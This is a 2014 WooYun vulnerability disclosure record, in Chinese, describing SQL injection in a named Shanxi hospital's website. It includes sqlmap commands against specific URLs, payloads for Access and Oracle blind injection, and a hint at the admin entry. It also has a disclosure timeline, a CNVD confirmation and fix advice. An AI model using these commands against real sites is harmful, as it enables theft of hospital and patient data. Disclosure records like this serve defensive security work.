{"id": 1501, "wybug_id": "wooyun-2014-069791", "wybug_title": "山西省某三甲医院access+oracle双数据库3处注射可脱裤", "wybug_corp": "山西省某医院", "wybug_author": "Ev1l", "wybug_date": "2014-07-26 20:00", "wybug_open_date": "2014-09-09 20:02", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-09：\t细节向公众公开  简要描述： 现在shell卖的好火……我这边刚挖出洞不到10分钟各大交易群就炒起来了医院的一些资料还是值得运维人员注意的……【听说下期是暴漫,想看的小伙伴mark】 详细说明：  首先百度了一下山西 医院  找到了第一条~哇带V，吓坏了，赶紧检测下~\n\n#01打开之后发现是asp的……那就老规矩注入点了，发现get没啥好注入的，发现首页有搜索栏，于是加了个单引号轻松报错~\n\n好了，抓包，跑一下结果代码：\nsqlmap -u http://www.sxsrmyy.com/ss/lindex.asp --data=\"content=1\"\n结果：\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: content    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: content=1%' AND 1820=1820 AND '%'='---[15:54:03] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft Access\n又一次的惊呆小伙伴，v的站asp+access[4 tables]+----------+| ad       || ask      || content  || usertype |+----------+#02转了转网站又点了几下，发现了另一个注入的地方，代码：\n-u http://www.sxsrmyy.com/ksjs/ks_index.asp?ksbh=6\n这个是get的直接注入……运维可以开除了！可惜的是经过证明这个和上一个点是同一个数据库结果：\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: ksbh    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ksbh=6' AND 8462=8462 AND 'jyjb'='jyjb---[15:59:20] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft Access\n你以为这就完了吗？不，更精彩的在后面！#03不甘心啊，一个这么大的站怎么可能只有一个access？于是乎发现了另一套系统\n\n瞬间来了兴趣，老规矩试一下搜索框，依然报错……运维拖出去打PP吧……抓包之后继续神器代码：\n-u http://www.sxsrmyy.com/qyxtyl/xztcy/index.asp --data=\"title=1\"\n转眼间就出来了结果，看来服务器不错……结果：\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: title    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: title=1%' AND 1674=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)||CHR(111)||CHR(78)||CHR(88),5) AND '%'='---[16:02:39] [INFO] the back-end DBMS is Oracleweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Oracle\n然后剩下的就自行挖掘吧……提醒一下在页面的下面有管理入口\n\n发现了山西山大新网科技，吓了一跳，结果发现和新网不是同一个单位……粗略的翻了下网站，竟然也有注射漏洞……\n\n好了，也就差不多4处漏洞了   漏洞证明：  见上文图片吧   修复方案：  1：开除运维，需要的话可以考虑我（我不是认真的……）2：参数过滤3：鉴于注射点过多，所以最好请专业人员进行专业检测4：数据库加密，信息暴漏的太多了   版权声明：转载请注明来源 Ev1l@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-07-31 10:34 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给山西分中心处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-27 10:45 |    \t\t腹黑 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:10        | (◦ \"̮ ◦))\t\t \n  前排~    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}